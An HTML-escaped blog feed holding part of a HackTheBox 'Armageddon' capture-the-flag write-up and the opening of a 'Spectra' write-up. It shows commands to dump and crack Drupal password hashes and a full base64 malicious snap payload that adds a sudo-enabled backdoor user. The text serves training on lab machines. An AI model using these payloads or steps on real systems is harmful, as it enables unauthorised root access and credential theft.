&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;rdf_mapping
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;registry
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;registry_file
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;role
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;role_permission
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;search_dataset
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;search_index
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;search_node_links
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;search_total
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;semaphore
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sequences
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sessions
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;shortcut_set
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;shortcut_set_users
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;system
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;taxonomy_index
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;taxonomy_term_data
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;taxonomy_term_hierarchy
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;taxonomy_vocabulary
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;url_alias
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;users
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;users_roles
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;variable
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;watchdog
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h3 id=&#34;arguments-used&#34;&gt;Arguments Used:&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;-u&lt;/code&gt;: The user we are going to log in as. This is followed by a &lt;code&gt;-&lt;/code&gt; and the password.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;-D&lt;/code&gt;: The database we are going to use.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;-e&lt;/code&gt;: Execute the statement and quit.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;From all these tables, the &lt;strong&gt;users&lt;/strong&gt; table is the most promising one (very common table to contain user credentials) so we are going to read it&amp;rsquo;s contents by using the following command (password reducted):&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;mysql -u drupaluser -*************** -D drupal -e &lt;span class=&#34;s1&#34;&gt;&amp;#39;select * from users;&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://netuserdoomdesire.github.io/Armageddon/9.png&#34; alt=&#34;Pasted image 20210724055855.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;Since the output is a little crowded, we can select only the columns that mater for each user (password reducted):&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;mysql -u drupaluser -*************** -D drupal -e &lt;span class=&#34;s1&#34;&gt;&amp;#39;select name,pass from users;&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://netuserdoomdesire.github.io/Armageddon/database.png&#34; alt=&#34;Pasted image 20210724060204.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;As a side note, the user Doomdesire is a user that we previously attempted to create on the initial login page. From here we get the username &lt;strong&gt;brucetherealadmin&lt;/strong&gt; as well as a hash, that we are of course going to crack. To crack the hash we are going to use JohnTheRipper:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;john &lt;span class=&#34;nb&#34;&gt;hash&lt;/span&gt; --wordlist&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;/usr/share/wordlists/rockyou.txt
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://netuserdoomdesire.github.io/Armageddon/11.png&#34; alt=&#34;Pasted image 20210724060632.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;Since we have now cracked the hash, we have a valid pair of credentials and log in as the user &lt;strong&gt;brucetherealadmin&lt;/strong&gt; via &lt;strong&gt;ssh&lt;/strong&gt;:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://netuserdoomdesire.github.io/Armageddon/12.png&#34; alt=&#34;Pasted image 20210724060911.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;We have now logged in as the user &lt;strong&gt;brucetherealadmin&lt;/strong&gt;.&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id=&#34;escalating-privileges-to-root&#34;&gt;Escalating Privileges to root&lt;/h1&gt;
&lt;p&gt;As with many other boxes, the very first thing to check, is if the user can run anything with sudo:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://netuserdoomdesire.github.io/Armageddon/13.png&#34; alt=&#34;Pasted image 20210724061138.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;It seems we can run &lt;strong&gt;/usr/bin/snap install *&lt;/strong&gt; with root privileges. Reading from the Snap page, &amp;ldquo;Snaps are cross-distribution, dependency-free, and easy to install applications packaged with all their dependencies to run on all major Linux distributions. As the current user it appears we can install .snap files.&lt;/p&gt;
&lt;p&gt;Searching for any vulnerability online, we get across this exploit &lt;a href=&#34;https://github.com/initstring/dirty_sock&#34;&gt;https://github.com/initstring/dirty_sock&lt;/a&gt;. while this particular exploit is not the one we want to use here, it can help us, because it uses a payload that is in fact a malicious snap package. Reading the exploit &amp;ldquo;dirty_sockv2.py&amp;rdquo; from the github page we see that it includes a base64 encoded string:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://netuserdoomdesire.github.io/Armageddon/14.png&#34; alt=&#34;Pasted image 20210724065759.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;with the following description:
&lt;code&gt;The following global is a base64 encoded string representing an installable snap package. The snap itself is empty and has no functionality. It does, however, have a bash-script in the install hook that will create a new user.&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;From the above we can conclude that this is the .snap file we want. If we can install it we will have our new user created on the box. In order to create the snap file we are going to use python2 (there are other ways to create it). We are going to use the python print funcion in order to print the base64 string and then this output is going to be piped to the base64 decoder and and then right into a .snap file. Something to point out here is that we are going to have to replace the single quotes of the github base64 string with double quotes. This is required because the single quote is going to be used for the python2 &lt;code&gt;-c&lt;/code&gt; argument:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;python2 -c &lt;span class=&#34;s1&#34;&gt;&amp;#39;print &amp;#34;aHNxcwcAAAAQIVZcAAACAAAAAAAEABEA0AIBAAQAAADgAAAAAAAAAI4DAAAAAAAAhgMAAAAAAAD//////////xICAAAAAAAAsAIAAAAAAAA+AwAAAAAAAHgDAAAAAAAAIyEvYmluL2Jhc2gKCnVzZXJhZGQgZGlydHlfc29jayAtbSAtcCAnJDYkc1daY1cxdDI1cGZVZEJ1WCRqV2pFWlFGMnpGU2Z5R3k5TGJ2RzN2Rnp6SFJqWGZCWUswU09HZk1EMXNMeWFTOTdBd25KVXM3Z0RDWS5mZzE5TnMzSndSZERoT2NFbURwQlZsRjltLicgLXMgL2Jpbi9iYXNoCnVzZXJtb2QgLWFHIHN1ZG8gZGlydHlfc29jawplY2hvICJkaXJ0eV9zb2NrICAgIEFMTD0oQUxMOkFMTCkgQUxMIiA+PiAvZXRjL3N1ZG9lcnMKbmFtZTogZGlydHktc29jawp2ZXJzaW9uOiAnMC4xJwpzdW1tYXJ5OiBFbXB0eSBzbmFwLCB1c2VkIGZvciBleHBsb2l0CmRlc2NyaXB0aW9uOiAnU2VlIGh0dHBzOi8vZ2l0aHViLmNvbS9pbml0c3RyaW5nL2RpcnR5X3NvY2sKCiAgJwphcmNoaXRlY3R1cmVzOgotIGFtZDY0CmNvbmZpbmVtZW50OiBkZXZtb2RlCmdyYWRlOiBkZXZlbAqcAP03elhaAAABaSLeNgPAZIACIQECAAAAADopyIngAP8AXF0ABIAerFoU8J/e5+qumvhFkbY5Pr4ba1mk4+lgZFHaUvoa1O5k6KmvF3FqfKH62aluxOVeNQ7Z00lddaUjrkpxz0ET/XVLOZmGVXmojv/IHq2fZcc/VQCcVtsco6gAw76gWAABeIACAAAAaCPLPz4wDYsCAAAAAAFZWowA/Td6WFoAAAFpIt42A8BTnQEhAQIAAAAAvhLn0OAAnABLXQAAan87Em73BrVRGmIBM8q2XR9JLRjNEyz6lNkCjEjKrZZFBdDja9cJJGw1F0vtkyjZecTuAfMJX82806GjaLtEv4x1DNYWJ5N5RQAAAEDvGfMAAWedAQAAAPtvjkc+MA2LAgAAAAABWVo4gIAAAAAAAAAAPAAAAAAAAAAAAAAAAAAAAFwAAAAAAAAAwAAAAAAAAACgAAAAAAAAAOAAAAAAAAAAPgMAAAAAAAAEgAAAAACAAw&amp;#34; + &amp;#34;A&amp;#34; * 4256 + &amp;#34;==&amp;#34;&amp;#39;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; base64 -d &amp;gt; Doomdesire.snap
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;We now have our .snap file:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://netuserdoomdesire.github.io/Armageddon/15.png&#34; alt=&#34;Pasted image 20210724070213.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;We can also read the file in order to get a general idea of how it is going to work:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://netuserdoomdesire.github.io/Armageddon/16.png&#34; alt=&#34;Pasted image 20210724070337.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;We can see that it is indeed going to add a new user called &lt;strong&gt;dirty_sock&lt;/strong&gt; and add him to the sudoers group with the permissions to run every command with sudo.&lt;/p&gt;
&lt;p&gt;The last step to exploit this, is to install our newly created .snap file:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sudo /usr/bin/snap install --devmode Doomdesire.snap
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://netuserdoomdesire.github.io/Armageddon/17.png&#34; alt=&#34;Pasted image 20210724070710.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;A very important thing to note here, is that the &lt;code&gt;--devmode&lt;/code&gt; is required for this to work. As we can read from the article describing this vulnerability that is linked on the end of this writeup, snaps themselves run in sandboxes and require digital signatures matching public keys that machines already trust. However, it is possible to lower these restrictions by indicating that a snap is in development (called devmode). This will give the snap access to the host Operating System just as any other application would have. Now that we installed our snap, the exploit has completed and we have a new user on the box. The user&amp;rsquo;s credentials are the following:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Username: dirty_sock&lt;/li&gt;
&lt;li&gt;Password: dirty_sock&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://netuserdoomdesire.github.io/Armageddon/18.png&#34; alt=&#34;Pasted image 20210724071226.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;Since the user can run anything with sudo, we simply changed to the root user with &lt;code&gt;sudo su&lt;/code&gt;&lt;/p&gt;
&lt;h1 id=&#34;useful-resources&#34;&gt;Useful Resources:&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://shenaniganslabs.io/2019/02/13/Dirty-Sock.html&#34;&gt;https://shenaniganslabs.io/2019/02/13/Dirty-Sock.html&lt;/a&gt;: Dirty_Sock Explained.&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://research.checkpoint.com/2018/uncovering-drupalgeddon-2/&#34;&gt;https://research.checkpoint.com/2018/uncovering-drupalgeddon-2/&lt;/a&gt;: Drupalgeddon2 Explained.&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://www.drupal.org/docs/7/install/step-3-create-settingsphp-and-the-files-directory&#34;&gt;https://www.drupal.org/docs/7/install/step-3-create-settingsphp-and-the-files-directory&lt;/a&gt;: Info about the settings.php file of Drupal.&lt;/li&gt;
&lt;/ul&gt;
</content>
            
            
            
                
                
                
                    
                    
                    
                        
                            <category scheme="https://netuserdoomdesire.github.io/posts/writeups/" term="posts\Writeups\" label="posts\Writeups\" />
                        
                    
                
            
            
            
                
                    
                
                    
                
            
        </entry>
    
        <entry>
            <title type="text">Spectra Writeup (HackTheBox)</title>
            <link rel="alternate" type="text/html" href="https://netuserdoomdesire.github.io/posts/writeups/spectra/" />
            <id>https://netuserdoomdesire.github.io/posts/writeups/spectra/</id>
            <updated>2021-06-26T19:03:12&#43;03:00</updated>
            <published>2021-06-26T10:00:00&#43;03:00</published>
            <author>
                    <name>Doomdesire</name>
                    <uri>https://netuserdoomdesire.github.io/</uri>
                    </author>
            <summary type="html">Overview Machine: https://www.hackthebox.eu/home/machines/profile/317
Spectra is an easy ChromeOS machine on HackTheBox created by egre55 (https://www.hackthebox.eu/home/users/profile/1190). We start by enumerating a Wordpress site as well as finding exposed credentials leading to access on the Administrator panel. From there we upload a malicious wordpress plugin that gets us a shell as the nginx user.</summary>
            
                <content type="html">&lt;p&gt;&lt;img src=&#34;https://netuserdoomdesire.github.io/Spectra/1.png&#34; alt=&#34;Pasted image 20210623152551.png&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;overview&#34;&gt;Overview&lt;/h1&gt;
&lt;p&gt;Machine: &lt;a href=&#34;https://www.hackthebox.eu/home/machines/profile/317&#34;&gt;https://www.hackthebox.eu/home/machines/profile/317&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Spectra is an easy ChromeOS machine on HackTheBox created by egre55 (&lt;a href=&#34;https://www.hackthebox.eu/home/users/profile/1190)&#34;&gt;https://www.hackthebox.eu/home/users/profile/1190)&lt;/a&gt;. We start by enumerating a Wordpress site as well as finding exposed credentials leading to access on the Administrator panel. From there we upload a malicious wordpress plugin that gets us a shell as the nginx user. We then again find a password file, this time belonging to a normal user, making us able to login via ssh. By taking advantage of the fact that the user can execute initctl with root privileges, we run a job that enables us to run bash with SUID permissions, obtaining root access.&lt;/p&gt;
&lt;h1 id=&#34;initial-reconnaissance&#34;&gt;Initial Reconnaissance&lt;/h1&gt;
&lt;h3 id=&#34;port-scanning&#34;&gt;Port Scanning:&lt;/h3&gt;
&lt;p&gt;We can start with the standard nmap, scanning the default ports:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;nmap -sC -sV 10.10.10.229 -oN spectra.nmap
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Starting Nmap 7.91 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; at 2021-06-23 15:16 EDT
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Nmap scan report &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; 10.10.10.229
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Host is up &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.081s latency&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Not shown: &lt;span class=&#34;m&#34;&gt;997&lt;/span&gt; closed ports
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;PORT     STATE SERVICE VERSION
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;22/tcp   open  ssh     OpenSSH 8.1 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;protocol 2.0&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; ssh-hostkey: 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_  &lt;span class=&#34;m&#34;&gt;4096&lt;/span&gt; 52:47:de:5c:37:4f:29:0e:8e:1d:88:6e:f9:23:4d:5a &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;RSA&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;80/tcp   open  http    nginx 1.17.4
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-server-header: nginx/1.17.4
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-title: Site doesn&lt;span class=&#34;err&#34;&gt;&amp;#39;&lt;/span&gt;t have a title &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;text/html&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;3306/tcp open  mysql   MySQL &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;unauthorized&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_ssl-cert: ERROR: Script execution failed &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;use -d to debug&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_ssl-date: ERROR: Script execution failed &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;use -d to debug&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_sslv2: ERROR: Script execution failed &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;use -d to debug&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_tls-alpn: ERROR: Script execution failed &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;use -d to debug&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_tls-nextprotoneg: ERROR: Script execution failed &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;use -d to debug&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Nmap &lt;span class=&#34;k&#34;&gt;done&lt;/span&gt;: &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; IP address &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; host up&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; scanned in 41.19 seconds
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h3 id=&#34;flags-used&#34;&gt;Flags used:&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;-sC: Scan with the default scripts&lt;/li&gt;
&lt;li&gt;-sV: Probe open ports to determine service/version info.&lt;/li&gt;
&lt;li&gt;-oN: Save the nmap output on the designated file in normal format.&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;web-server&#34;&gt;Web Server&lt;/h3&gt;
&lt;p&gt;From the nmap scan we can see that an &lt;strong&gt;HTTP&lt;/strong&gt; server is hosted on port &lt;strong&gt;80&lt;/strong&gt;. HTTP servers are generally the right path to start enumerating so we visit the page:
&lt;img src=&#34;https://netuserdoomdesire.github.io/Spectra/2.png&#34; alt=&#34;Pasted image 20210623153743.png&#34;&gt;
The server appears to be used for issue tracking. By clicking around the page we see the following:
&lt;img src=&#34;https://netuserdoomdesire.github.io/Spectra/3.png&#34; alt=&#34;Pasted image 20210623154304.png&#34;&gt;
This means the server tries to reach &lt;strong&gt;spectra.htb&lt;/strong&gt;, which is not mapped to an IP address. That in turn means we cannot continue until we edit our hosts file to map &lt;strong&gt;spectra.htb&lt;/strong&gt; to &lt;strong&gt;10.10.10.229&lt;/strong&gt; which is our target&amp;rsquo;s IP. We can do that with &lt;code&gt;nano /etc/hosts&lt;/code&gt;:
&lt;img src=&#34;https://netuserdoomdesire.github.io/Spectra/4.png&#34; alt=&#34;Pasted image 20210623154645.png&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;first-link-wordpress-site&#34;&gt;First Link (Wordpress Site)&lt;/h3&gt;
&lt;p&gt;By saving the hosts file, we can now navigate the pages. By clicking on the &lt;strong&gt;Software Issue Tracker&lt;/strong&gt; link now correctly redirects us to the following page:
